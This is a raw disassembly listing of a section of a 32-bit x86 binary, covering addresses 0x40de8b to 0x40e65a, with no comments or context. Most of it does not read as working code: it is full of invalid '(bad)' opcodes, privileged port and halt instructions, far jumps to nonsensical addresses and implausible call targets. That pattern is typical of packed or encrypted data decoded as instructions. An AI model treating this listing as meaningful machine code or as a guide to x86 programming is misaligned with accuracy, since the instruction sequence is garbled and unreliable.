  40de8b:	push   0xffffff8c
  40de8d:	fisttp QWORD PTR [ebx]
  40de8f:	retf   0x2aaf
  40de92:	mov    ah,bl
  40de94:	jl     0x40deac
  40de96:	bound  esp,QWORD PTR [ecx]
  40de98:	mov    bl,0xec
  40de9a:	pop    ds
  40de9b:	scas   eax,DWORD PTR es:[edi]
  40de9c:	test   eax,0x1f0b2ce1
  40dea1:	imul   esp,DWORD PTR [ecx+esi*8-0x32],0xffffff96
  40dea6:	sbb    DWORD PTR cs:[eax-0x266c62fb],ecx
  40dead:	aaa    
  40deae:	(bad)  
  40deaf:	pushf  
  40deb0:	dec    edi
  40deb1:	aam    0xdf
  40deb3:	push   DWORD PTR [esi-0x36]
  40deb6:	jge    0x40dea5
  40deb8:	jecxz  0x40de46
  40deba:	dec    esi
  40debb:	and    al,0x57
  40debd:	fidivr DWORD PTR [esi]
  40debf:	pop    esi
  40dec0:	or     eax,0xbfe2dc51
  40dec5:	ret    0xa624
  40dec8:	mov    cl,0xea
  40deca:	jmp    0x40df1e
  40decc:	and    DWORD PTR [edi+0x43229a24],esi
  40ded2:	pop    ebx
  40ded3:	in     eax,0x25
  40ded5:	jl     0x40dede
  40ded7:	loop   0x40df4f
  40ded9:	push   es
  40deda:	mov    ah,0x7f
  40dedc:	add    al,0xb9
  40dede:	stos   BYTE PTR es:[edi],al
  40dedf:	int    0xf6
  40dee1:	jp     0x40de78
  40dee3:	mov    ecx,ds
  40dee5:	das    
  40dee6:	push   ebp
  40dee7:	mov    WORD PTR [esi+0x3703d6e1],fs
  40deed:	or     DWORD PTR [esi],esp
  40deef:	mov    BYTE PTR [ebp-0x15],bl
  40def2:	push   ebx
  40def3:	loopne 0x40dece
  40def5:	clc    
  40def6:	cmc    
  40def7:	sahf   
  40def8:	lods   al,BYTE PTR ds:[esi]
  40def9:	out    0x8f,al
  40defb:	repz pusha 
  40defd:	ror    DWORD PTR [ecx],1
  40deff:	mov    al,0xe7
  40df01:	nop
  40df02:	jmp    0xc9cb:0xb7f41baf
  40df09:	or     ch,ah
  40df0b:	pushw  ss
  40df0d:	add    al,BYTE PTR [edx+0x59]
  40df10:	sbb    BYTE PTR [esi+0x2],0x1e
  40df14:	mov    fs,WORD PTR [ecx+ebp*4-0x49]
  40df18:	jmp    0x40df76
  40df1a:	push   edi
  40df1b:	mov    ds:0x433dd626,al
  40df20:	outs   dx,BYTE PTR ds:[esi]
  40df21:	stos   DWORD PTR es:[edi],eax
  40df22:	lahf   
  40df23:	js     0x40df01
  40df25:	mov    ah,0x6e
  40df27:	fs jp  0x40dee2
  40df2a:	mov    bh,0x37
  40df2c:	fs mov ah,0x60
  40df2f:	or     ebx,DWORD PTR [esi+0x18313ce2]
  40df35:	adc    BYTE PTR [ebx-0x47],dh
  40df38:	fwait
  40df39:	jnp    0x40ded8
  40df3b:	sbb    edx,esp
  40df3d:	xchg   edx,eax
  40df3e:	das    
  40df3f:	fs retf 
  40df41:	aaa    
  40df42:	pop    ebx
  40df43:	fmul   st(3),st
  40df45:	dec    ebp
  40df46:	and    al,0x2b
  40df48:	pop    edi
  40df49:	mov    al,ds:0x3d3209e1
  40df4e:	data16 mov dh,0xc0
  40df51:	ins    BYTE PTR es:[edi],dx
  40df52:	cs adc ebp,0x2763a740
  40df59:	aaa    
  40df5a:	fist   WORD PTR [ebx+ecx*8]
  40df5d:	iret   
  40df5e:	or     eax,0x446929d0
  40df63:	adc    DWORD PTR [eax],edx
  40df65:	in     eax,dx
  40df66:	or     al,0xec
  40df68:	dec    edx
  40df69:	push   es
  40df6a:	mov    ds:0x900848d4,al
  40df6f:	fsubr  st(2),st
  40df71:	push   ss
  40df72:	dec    edx
  40df73:	out    0xbc,al
  40df75:	push   ebx
  40df76:	sub    al,0x2b
  40df78:	fld    DWORD PTR [edi+0x458b49cb]
  40df7e:	in     al,0xf
  40df80:	scas   eax,DWORD PTR es:[edi]
  40df81:	rol    DWORD PTR [ebx],0xe0
  40df84:	xchg   edx,eax
  40df85:	push   eax
  40df86:	xor    ebx,ebx
  40df88:	mov    edx,esp
  40df8a:	dec    edx
  40df8b:	inc    ebx
  40df8c:	add    ebx,DWORD PTR [edx+ebx*1]
  40df8f:	dec    ebx
  40df90:	xor    edx,edx
  40df92:	add    DWORD PTR [ebp-0xc],ebx
  40df95:	pop    ebx
  40df96:	jmp    0x40e0f4
  40df9b:	mov    BYTE PTR [eax+0x5d7fc57f],cl
  40dfa1:	pop    esp
  40dfa2:	pop    ebp
  40dfa3:	in     eax,0x25
  40dfa5:	pop    ebp
  40dfa6:	shl    DWORD PTR [ebp-0x78a0458a],1
  40dfac:	xchg   DWORD PTR [esi+0x7e],edi
  40dfaf:	aas    
  40dfb0:	jg     0x40e030
  40dfb2:	jle    0x40dfc4
  40dfb4:	popf   
  40dfb5:	enter  0xbae4,0xb9
  40dfb9:	adc    eax,DWORD PTR [ecx+eax*8+0x78e6e198]
  40dfc0:	add    eax,DWORD PTR [edi+0x75]
  40dfc3:	push   si
  40dfc5:	mov    ebx,DWORD PTR [ebx]
  40dfc7:	test   DWORD PTR [esi+0x3b],0x86920ed
  40dfce:	int3   
  40dfcf:	xchg   edi,eax
  40dfd0:	loope  0x40e037
  40dfd2:	dec    ecx
  40dfd3:	cmp    esi,DWORD PTR [eax-0x5d]
  40dfd6:	test   al,ch
  40dfd8:	loope  0x40dfea
  40dfda:	in     al,dx
  40dfdb:	sti    
  40dfdc:	jmp    0x40df69
  40dfde:	xchg   ecx,eax
  40dfdf:	and    bh,BYTE PTR [eax-0x32]
  40dfe2:	out    0x38,eax
  40dfe4:	js     0x40df6b
  40dfe6:	sbb    BYTE PTR gs:[edx+ebx*8+0x1c],cl
  40dfeb:	jo     0x40df71
  40dfed:	pop    ds
  40dfee:	cmp    bl,BYTE PTR ds:0xc19f3e63
  40dff4:	ret    0x8e8d
  40dff7:	in     al,0xee
  40dff9:	or     DWORD PTR [ebx-0x1db2251a],0xd50ea5eb
  40e003:	call   0xa08a309c
  40e008:	adc    al,BYTE PTR [esi+0x5c]
  40e00b:	test   DWORD PTR [ebp+0x60],esi
  40e00e:	or     al,0xa0
  40e010:	sbb    al,0xce
  40e012:	arpl   WORD PTR [esi+0x7eb9cfd2],sp
  40e018:	out    0x5,eax
  40e01a:	lods   al,BYTE PTR ds:[esi]
  40e01b:	lahf   
  40e01c:	cmc    
  40e01d:	pusha  
  40e01e:	or     al,0xf4
  40e020:	mov    al,0x74
  40e022:	(bad)  
  40e024:	dec    esp
  40e025:	or     BYTE PTR [esi-0x1f],ch
  40e028:	xor    dh,dh
  40e02a:	push   esi
  40e02b:	mov    al,0x4f
  40e02d:	mov    esp,0xe69caa9c
  40e032:	dec    ebp
  40e033:	mov    ebx,0x872f0a1
  40e038:	rol    DWORD PTR [edx],1
  40e03a:	imul   edi,DWORD PTR [eax+0x66ac0eba],0xffffffd7
  40e041:	stos   DWORD PTR es:[edi],eax
  40e042:	in     eax,dx
  40e043:	(bad)  
  40e045:	push   ebp
  40e046:	push   ebp
  40e047:	lods   eax,DWORD PTR ds:[esi]
  40e048:	aam    0x4f
  40e04a:	jb     0x40e05d
  40e04c:	mov    edi,0xee79b0e1
  40e051:	cmp    DWORD PTR [ebx-0x66],esp
  40e054:	add    al,0x62
  40e056:	jo     0x40e0a6
  40e058:	jmp    0x40e05f
  40e05a:	test   eax,0x4f0b8055
  40e05f:	adc    BYTE PTR cs:[ecx+0x2dc5bbed],ah
  40e066:	into   
  40e067:	mov    eax,ds:0xac0a8bb3
  40e06c:	loop   0x40e03e
  40e06e:	jecxz  0x40e021
  40e070:	add    DWORD PTR [ebp-0x30fa557f],0xf53266f9
  40e07a:	data16 or dl,0xf6
  40e07e:	jae    0x40e0f0
  40e080:	sub    edx,DWORD PTR [ebp+0x7c682d06]
  40e086:	std    
  40e087:	push   ebx
  40e088:	push   es
  40e089:	imul   eax,DWORD PTR [ecx-0x58],0x7cebe8b4
  40e090:	and    ecx,esi
  40e092:	add    eax,0x2fecac68
  40e097:	ret    0x8a13
  40e09a:	add    BYTE PTR [esp+eiz*2+0x69783cd8],bl
  40e0a1:	cmc    
  40e0a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0a3:	sbb    eax,0xa8342df1
  40e0a8:	sub    eax,0x1d9246b
  40e0ad:	push   ebp
  40e0ae:	stc    
  40e0af:	pop    es
  40e0b0:	ret    0x91e9
  40e0b3:	aad    0xd3
  40e0b5:	sbb    BYTE PTR [ebx-0x502e124d],al
  40e0bb:	pushf  
  40e0bc:	jmp    0x40e07b
  40e0be:	xor    eax,0x2007a741
  40e0c3:	aas    
  40e0c4:	add    eax,0x91577f1d
  40e0c9:	pusha  
  40e0ca:	stc    
  40e0cb:	retf   
  40e0cc:	cwde   
  40e0cd:	jns    0x40e13b
  40e0cf:	lea    eax,[esi+ecx*4]
  40e0d2:	xchg   ebp,eax
  40e0d3:	cdq    
  40e0d4:	lods   al,BYTE PTR ds:[esi]
  40e0d5:	scas   al,BYTE PTR es:[edi]
  40e0d6:	mov    fs,WORD PTR [edx+0x557b2647]
  40e0dc:	bound  esi,QWORD PTR [ecx]
  40e0de:	mov    eax,0x50095ad
  40e0e3:	cdq    
  40e0e4:	inc    esi
  40e0e5:	jnp    0x40e100
  40e0e7:	mov    esp,0xa1c47bca
  40e0ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0ed:	imul   ebx,DWORD PTR [esi],0x22be6f1e
  40e0f3:	fimul  WORD PTR [ebx+0x5e5ff445]
  40e0f9:	pop    ebx
  40e0fa:	leave  
  40e0fb:	ret    0x10
  40e0fe:	dec    ebp
  40e0ff:	push   ebp
  40e100:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40e106:	mov    esp,ebp
  40e108:	or     ah,dh
  40e10a:	dec    ebp
  40e10b:	add    bh,al
  40e10d:	add    BYTE PTR [eax],cl
  40e10f:	add    BYTE PTR [eax],al
  40e111:	mov    DWORD PTR [eax],0x40f44545
  40e117:	xor    eax,0x9c8b8500
  40e11c:	hlt    
  40e11d:	clc    
  40e11e:	retf   
  40e11f:	(bad)  
  40e120:	enter  0x4d45,0xbc
  40e124:	mov    esi,DWORD PTR [edx]
  40e126:	hlt    
  40e127:	test   ebx,ecx
  40e129:	pushf  
  40e12a:	enter  0x4df8,0x8b
  40e12e:	mov    DWORD PTR [ebp-0x20],0x890208
  40e135:	inc    ebp
  40e136:	inc    ebp
  40e137:	cld    
  40e138:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e13e:	or     BYTE PTR [ebx+0x0],dl
  40e141:	mov    ebx,0x8bd5600
  40e146:	call   DWORD PTR [ecx-0x1]
  40e149:	pop    es
  40e14a:	mov    ch,0x33
  40e14c:	dec    ebx
  40e14e:	(bad)  
  40e14f:	mov    eax,0x72009da4
  40e154:	push   DWORD PTR [edx]
  40e156:	or     BYTE PTR [eax],al
  40e158:	jmp    0xff89:0x75c84d03
  40e15f:	dec    ebp
  40e160:	loopne 0x40e132
  40e162:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e168:	add    BYTE PTR [ebx],dh
  40e16a:	mov    ecx,ebx
  40e16c:	hlt    
  40e16d:	add    ecx,ebx
  40e16f:	enter  0x899d,0x32
  40e173:	dec    ebp
  40e174:	add    ecx,eax
  40e176:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e17c:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e183:	xor    ecx,ebx
  40e185:	retf   
  40e186:	enter  0x4d03,0xc8
  40e18a:	mov    DWORD PTR fs:[eax],ebx
  40e18d:	lea    eax,[eax]
  40e18f:	push   esp
  40e190:	mov    edi,edi
  40e192:	fs (bad) 
  40e194:	(bad)  
  40e195:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e19b:	push   0xffffffff
  40e19d:	and    bh,bh
  40e19f:	pop    ecx
  40e1a0:	inc    eax
  40e1a1:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e1a7:	push   0xffffff8b
  40e1a9:	pop    ecx
  40e1aa:	cld    
  40e1ab:	dec    ebp
  40e1ac:	lea    ecx,[ecx+0x45ff08ff]
  40e1b2:	mov    BYTE PTR [edx+0x1],cl
  40e1b5:	add    BYTE PTR [eax],al
  40e1b7:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e1be:	dec    DWORD PTR [ebp-0x77]
  40e1c1:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e1c8:	cld    
  40e1c9:	dec    ebp
  40e1ca:	jne    0x40e1ff
  40e1cc:	lea    eax,[ebx]
  40e1ce:	push   eax
  40e1cf:	mov    edi,edi
  40e1d1:	or     BYTE PTR [ecx+0x54a845],cl
  40e1d7:	add    al,ch
  40e1d9:	(bad)  
  40e1da:	sub    esp,ebp
  40e1dc:	add    BYTE PTR [eax],al
  40e1de:	rol    BYTE PTR [eax],0x84
  40e1e1:	inc    ebp
  40e1e2:	add    dh,BYTE PTR [esi+0x0]
  40e1e5:	add    BYTE PTR [ebp-0x73],al
  40e1e8:	mov    ebp,DWORD PTR [esp+edx*4]
  40e1eb:	inc    DWORD PTR [eax]
  40e1ed:	lea    ecx,[ebx-0x30074f4]
  40e1f3:	call   0x41ed78
  40e1f8:	add    BYTE PTR [ebp+0x0],cl
  40e1fb:	jne    0x40e23e
  40e1fd:	dec    DWORD PTR [ebx-0x76210314]
  40e203:	dec    ebp
  40e204:	add    DWORD PTR [ebp+0x0],esi
  40e207:	(bad)  
  40e208:	xchg   ebp,eax
  40e209:	loopne 0x40e20a
  40e20b:	inc    eax
  40e20c:	inc    DWORD PTR [eax]
  40e20e:	mov    ecx,DWORD PTR [ebp-0x4]
  40e211:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e217:	add    BYTE PTR [edx],dl
  40e219:	enter  0x4d90,0x0
  40e21d:	mov    eax,DWORD PTR [eax]
  40e21f:	hlt    
  40e220:	add    al,0xa5
  40e222:	mov    al,0xff
  40e224:	add    bh,bh
  40e226:	add    BYTE PTR [ebx],dh
  40e228:	inc    DWORD PTR [ebx]
  40e22a:	sbb    al,0x89
  40e22c:	jne    0x40e206
  40e22e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e234:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e23a:	mov    DWORD PTR [eax-0x70],0xe058e189
  40e241:	inc    DWORD PTR [ebp-0x75]
  40e244:	ror    DWORD PTR [esi+ebp*8],1
  40e247:	test   DWORD PTR [esi-0x1],esp
  40e24a:	inc    ebp
  40e24b:	(bad)  
  40e24c:	aas    
  40e24d:	inc    ebp
  40e24e:	(bad)  
  40e24f:	lea    edi,[esp+eiz*2-0x1]
  40e253:	push   DWORD PTR [edi]
  40e255:	mov    DWORD PTR [ecx],esi
  40e257:	mov    al,ds:0x8b8000c7
  40e25c:	loopne 0x40e25a
  40e25e:	jmp    0xdfff:0xeeff458d
  40e265:	mov    bh,al
  40e267:	add    DWORD PTR [eax-0x1fba1500],ecx
  40e26d:	inc    DWORD PTR [ebp-0x4]
  40e270:	xlat   BYTE PTR ds:[ebx]
  40e271:	lea    edi,[edi]
  40e273:	inc    edi
  40e275:	jmp    FWORD PTR [eax-0x78]
  40e278:	inc    DWORD PTR [ecx]
  40e27a:	aaa    
  40e27b:	add    BYTE PTR [ecx],dh
  40e27d:	repnz mov DWORD PTR [eax],0xfff856c
  40e284:	ffreep st(5)
  40e286:	aas    
  40e287:	add    bh,al
  40e289:	mov    esi,DWORD PTR [eax-0x4]
  40e28c:	inc    DWORD PTR [eax+0xdf01ee]
  40e292:	(bad)  
  40e293:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e297:	mov    esp,ebx
  40e299:	xchg   esp,eax
  40e29a:	rol    DWORD PTR [eax],cl
  40e29c:	(bad)  
  40e29d:	mov    edi,DWORD PTR [eax+0x3]
  40e2a0:	(bad)  
  40e2a1:	cmp    al,0xd7
  40e2a3:	dec    ebp
  40e2a4:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  40e2aa:	add    BYTE PTR [ebp-0x3b375],cl
  40e2b0:	adc    BYTE PTR [edx+0x1],0x55
  40e2b4:	add    BYTE PTR [ebx+0x58c30],cl
  40e2ba:	add    BYTE PTR [ebx-0x778afc7b],cl
  40e2c0:	mov    eax,DWORD PTR [eax]
  40e2c2:	cld    
  40e2c3:	push   0x7d
  40e2c5:	dec    DWORD PTR [ebx+0xd88c]
  40e2cb:	push   edx
  40e2cc:	mov    edx,DWORD PTR [ecx-0x4]
  40e2cf:	call   DWORD PTR [eax+0x7d01fc]
  40e2d5:	mov    esp,DWORD PTR [esp+edi*8]
  40e2d8:	add    BYTE PTR [eax+0x560150],dl
  40e2de:	test   DWORD PTR [ebp+0x75],eax
  40e2e1:	jmp    0x947d:0xc7fce28b
  40e2e8:	mov    ebp,ebx
  40e2ea:	fcom   st(7)
  40e2ec:	add    bh,al
  40e2ee:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e2f4:	add    edi,edi
  40e2f6:	add    bh,bh
  40e2f8:	add    ah,cl
  40e2fa:	add    dh,dl
  40e2fc:	push   eax
  40e2fd:	inc    ebp
  40e2fe:	push   esi
  40e2ff:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e305:	test   BYTE PTR [ebx],dh
  40e307:	(bad)  
  40e308:	add    eax,0x4572cc
  40e30d:	jecxz  0x40e2d0
  40e30f:	rol    DWORD PTR [edi+eax*8-0x2eff73ff],cl
  40e316:	inc    esi
  40e317:	jle    0x40e319
  40e319:	test   edi,eax
  40e31b:	jmp    esp
  40e31d:	inc    DWORD PTR [eax]
  40e31f:	loope  0x40e321
  40e321:	(bad)  
  40e322:	jne    0x40e2a9
  40e324:	mov    edi,edi
  40e326:	cld    
  40e327:	inc    DWORD PTR [ebp-0x20]
  40e32a:	mov    ebp,edx
  40e32c:	mov    ah,0x85
  40e32e:	add    bh,bh
  40e330:	call   0x1170c34
  40e335:	int3   
  40e336:	mov    eax,DWORD PTR [ebp-0x7f0004]
  40e33c:	add    ebx,ebp
  40e33e:	add    al,ah
  40e340:	xor    BYTE PTR [ebp-0xff0085],al
  40e346:	mov    edx,ecx
  40e348:	cld    
  40e349:	jle    0x40e2d4
  40e34b:	push   ebx
  40e34c:	add    DWORD PTR [eax],eax
  40e34e:	add    BYTE PTR [eax+0x1],dl
  40e351:	inc    ebp
  40e352:	inc    ebp
  40e353:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e359:	dec    DWORD PTR [ebx-0x3fd90318]
  40e35f:	add    BYTE PTR [ebp-0xbf0040],dl
  40e365:	inc    ebp
  40e366:	retf   0x8b
  40e369:	cld    
  40e36a:	push   eax
  40e36b:	mov    al,0x45
  40e36d:	add    DWORD PTR [ebx+0x459c00],ecx
  40e373:	mov    edi,edi
  40e375:	mov    eax,0xe80800ff
  40e37a:	inc    ebp
  40e37b:	sub    DWORD PTR [ebx-0x47000400],ecx
  40e381:	add    al,0x1
  40e383:	rol    BYTE PTR [eax],0x1e
  40e386:	jne    0x40e3cd
  40e388:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e38e:	inc    DWORD PTR [ecx]
  40e390:	call   0x860b95
  40e395:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e39b:	call   0x410ca1
  40e3a0:	xor    bh,bh
  40e3a2:	push   edi
  40e3a3:	adc    BYTE PTR [ebx-0x747423bb],al
  40e3a9:	loopne 0x40e387
  40e3ab:	ret    
  40e3ac:	loopne 0x40e34b
  40e3ae:	xor    DWORD PTR [edx],0x31
  40e3b1:	cmp    edi,edi
  40e3b3:	bswap  esp
  40e3b5:	rol    BYTE PTR gs:[eax],0x5
  40e3b9:	jmp    0x12be503
  40e3be:	mov    eax,DWORD PTR [ebp-0x4]
  40e3c1:	add    BYTE PTR [eax+0xff0100],bh
  40e3c7:	cld    
  40e3c8:	jne    0x40e447
  40e3ca:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e3d0:	pusha  
  40e3d1:	add    DWORD PTR [eax],eax
  40e3d3:	add    BYTE PTR [eax-0x37],dl
  40e3d6:	inc    ebp
  40e3d7:	add    BYTE PTR [ebx+0x459850],cl
  40e3dd:	mov    edi,edi
  40e3df:	test   al,0xff
  40e3e1:	add    BYTE PTR [eax],cl
  40e3e3:	inc    DWORD PTR [ebp-0x18]
  40e3e6:	jmp    DWORD PTR ds:0x4d7d00dc
  40e3ec:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e3f2:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e3f8:	popf   
  40e3f9:	mov    eax,0x30132
  40e3fe:	lea    esi,[ebp+0x2c]
  40e401:	xor    edi,edi
  40e403:	(bad)  
  40e404:	call   0x1400c71
  40e409:	call   0x1350c99
  40e40e:	jne    0x40e39b
  40e410:	xor    edi,esp
  40e412:	add    eax,DWORD PTR [eax+0xc018d]
  40e418:	push   DWORD PTR [eax]
  40e41a:	call   0xca0c76
  40e41f:	int3   
  40e420:	inc    DWORD PTR [ebp-0x14]
  40e423:	mov    ecx,DWORD PTR [ebp-0x28]
  40e426:	xor    eax,DWORD PTR [eax]
  40e428:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e42e:	(bad)  
  40e42f:	xchg   ebp,eax
  40e430:	in     al,0xff
  40e432:	add    bh,bh
  40e434:	add    BYTE PTR [edi+0x508b0045],bl
  40e43a:	or     BYTE PTR [ebp-0x3d],al
  40e43d:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff63]
  40e444:	mov    edi,edi
  40e446:	or     BYTE PTR [eax],cl
  40e448:	inc    ebp
  40e449:	test   DWORD PTR gs:[eax],eax
  40e44c:	je     0x40e493
  40e44e:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e454:	xor    edx,DWORD PTR [eax-0x73]
  40e457:	push   ebp
  40e458:	or     BYTE PTR [ebp+0x21007572],al
  40e45e:	inc    ebp
  40e45f:	in     al,dx
  40e460:	mov    ebp,DWORD PTR [eax]
  40e462:	mov    esp,0x638bc345
  40e467:	fmul   st,st(5)
  40e469:	add    BYTE PTR [ebx],ch
  40e46b:	mov    eax,DWORD PTR [ebx]
  40e46d:	cld    
  40e46e:	loopne 0x40e430
  40e470:	inc    ebp
  40e471:	push   ebp
  40e472:	cmp    ebp,eax
  40e474:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e47b:	cld    
  40e47c:	fadd   DWORD PTR [eax+0x3b014d]
  40e482:	jne    0x40e4b4
  40e484:	push   0xf8898557
  40e489:	in     al,dx
  40e48a:	jne    0x40e4d1
  40e48c:	lea    eax,[ebx+0x72e8dcc8]
  40e492:	xor    BYTE PTR [ebx+0x7545bc00],cl
  40e498:	jmp    0x40e4cd
  40e49a:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e4a0:	xor    eax,edi
  40e4a2:	adc    DWORD PTR [ebp-0xcd0063],0x8b2b31
  40e4ac:	rcl    BYTE PTR [eax-0x40],1
  40e4af:	inc    ebp
  40e4b0:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e4b8:	inc    ebp
  40e4b9:	xchg   ebp,eax
  40e4ba:	ud0    ebp,DWORD PTR [ebx]
  40e4bd:	inc    DWORD PTR [eax]
  40e4bf:	adc    eax,0x508a0076
  40e4c4:	adc    BYTE PTR [ebp+0x1f],0x8b
  40e4c8:	or     al,0xf4
  40e4ca:	inc    eax
  40e4cb:	retf   
  40e4cc:	inc    ebp
  40e4cd:	iret   
  40e4ce:	jb     0x40e498
  40e4d0:	mov    eax,DWORD PTR [edi]
  40e4d2:	enter  0x4545,0x1
  40e4d6:	xor    eax,0x898b9c00
  40e4db:	mov    esp,0x33324df0
  40e4e0:	pushf  
  40e4e1:	lea    ecx,[ecx+0x4d72e008]
  40e4e7:	add    BYTE PTR [ebx],dh
  40e4e9:	inc    ebp
  40e4ea:	mov    DWORD PTR [ebx-0x3f621b4c],ecx
  40e4f0:	xor    dl,BYTE PTR [edx]
  40e4f2:	add    eax,DWORD PTR [ebp-0x77]
  40e4f5:	mov    eax,esp
  40e4f7:	fmul   DWORD PTR [ebp-0x3d]
  40e4fa:	xor    eax,DWORD PTR [ebx+eax*1+0x832899d]
  40e501:	mov    DWORD PTR [ebp-0x28],eax
  40e504:	aad    0x45
  40e506:	pushf  
  40e507:	xor    eax,edi
  40e509:	mov    ecx,0xff858db0
  40e50e:	clc    
  40e50f:	enter  0x4d45,0x30
  40e513:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e51a:	test   esi,edi
  40e51c:	clc    
  40e51d:	inc    DWORD PTR [ebp+0x45]
  40e520:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e528:	test   DWORD PTR ds:0xff459cf8,esi
  40e52e:	cmp    al,0xfc
  40e530:	pushf  
  40e531:	inc    ebp
  40e532:	mov    edx,DWORD PTR [eax-0x28]
  40e535:	popf   
  40e536:	push   ebp
  40e537:	add    BYTE PTR [ebx],dh
  40e539:	mov    DWORD PTR [ebx],eax
  40e53b:	sar    BYTE PTR [ebx],1
  40e53d:	adc    BYTE PTR [edi],cl
  40e53f:	dec    ebp
  40e540:	adc    al,0x8b
  40e542:	add    al,dl
  40e544:	jmp    0x101e714
  40e549:	jb     0x40e598
  40e54b:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e551:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e554:	xor    ecx,DWORD PTR [edi]
  40e556:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e55a:	(bad)  
  40e55c:	clc    
  40e55d:	enter  0x8400,0x8b
  40e561:	pop    es
  40e562:	mov    al,0x0
  40e564:	push   ebp
  40e565:	push   cs
  40e566:	xor    ecx,eax
  40e568:	xor    esp,ecx
  40e56a:	add    ebp,DWORD PTR [eax]
  40e56c:	add    esi,DWORD PTR [eax]
  40e56e:	(bad)  
  40e570:	retf   0x55c8
  40e573:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e577:	(bad)  
  40e578:	cli    
  40e579:	fdivr  st,st(1)
  40e57b:	test   DWORD PTR [eax+edi*8],ecx
  40e57e:	dec    ebp
  40e57f:	inc    ebp
  40e580:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e586:	add    BYTE PTR [ebp+0x0],al
  40e589:	mov    ecx,DWORD PTR [ebp-0x28]
  40e58c:	mov    ecx,ebx
  40e58e:	clc    
  40e58f:	jne    0x40e55c
  40e591:	mov    esi,0xd672d3
  40e596:	into   
  40e597:	into   
  40e598:	scas   eax,DWORD PTR es:[edi]
  40e599:	dec    ebp
  40e59a:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e5a0:	sub    ecx,esi
  40e5a2:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e5a5:	(bad)  
  40e5a6:	mov    edi,eax
  40e5a8:	mov    al,0x85
  40e5aa:	mov    eax,edi
  40e5ac:	add    BYTE PTR [ebp-0x75],al
  40e5af:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e5b6:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e5bc:	rdtsc  
  40e5be:	retf   0x559c
  40e5c1:	(bad)  
  40e5c2:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e5c9:	inc    ebp
  40e5ca:	add    eax,0xeb9c4d3f
  40e5cf:	(bad)  
  40e5d0:	mov    ecx,esp
  40e5d2:	lods   al,BYTE PTR ds:[esi]
  40e5d3:	test   DWORD PTR [ebp-0x8],edx
  40e5d6:	xor    ecx,DWORD PTR [ebp+0x33]
  40e5d9:	mov    eax,DWORD PTR [ebx]
  40e5db:	lock add ecx,ebx
  40e5de:	bswap  esi
  40e5e0:	retf   0x55d1
  40e5e3:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e5e9:	jmp    0x40e5e4
  40e5eb:	add    BYTE PTR ds:0xebc44d8b,al
  40e5f1:	push   ebp
  40e5f2:	mov    ebp,DWORD PTR [ebx]
  40e5f4:	test   al,0x8b
  40e5f6:	push   ebp
  40e5f7:	clc    
  40e5f8:	xor    ecx,ebx
  40e5fa:	xor    ecx,esi
  40e5fc:	add    edx,ecx
  40e5fe:	add    eax,DWORD PTR [edx+0xca010f]
  40e604:	push   ebp
  40e605:	dec    ebp
  40e606:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e60c:	stc    
  40e60d:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e613:	scas   eax,DWORD PTR es:[edi]
  40e614:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e61a:	xor    ebp,DWORD PTR [ebx]
  40e61c:	xor    edi,DWORD PTR [ebx]
  40e61e:	add    esi,DWORD PTR [edi+0x3]
  40e621:	mov    ecx,DWORD PTR [edi]
  40e623:	clc    
  40e624:	retf   0x55cb
  40e627:	into   
  40e628:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e62f:	mov    eax,0x3376554d
  40e634:	mov    esi,DWORD PTR [ebx]
  40e636:	int3   
  40e637:	add    edx,DWORD PTR [ebp+0x3]
  40e63a:	xor    ecx,DWORD PTR [edi]
  40e63c:	xor    ecx,edx
  40e63e:	add    edx,DWORD PTR [ebp+0x3]
  40e641:	mov    ecx,DWORD PTR [edi]
  40e643:	lock retf 0x4dfa
  40e647:	stc    
  40e648:	mov    ecx,DWORD PTR [eax]
  40e64a:	or     BYTE PTR [ebp+0x4d],cl
  40e64d:	jmp    0x104e6dd
  40e652:	dec    ebp
  40e653:	dec    ebp
  40e654:	(bad)  
  40e655:	mov    ebx,esp
  40e657:	clc    
  40e658:	test   ebx,ecx
  40e65a:	clc    
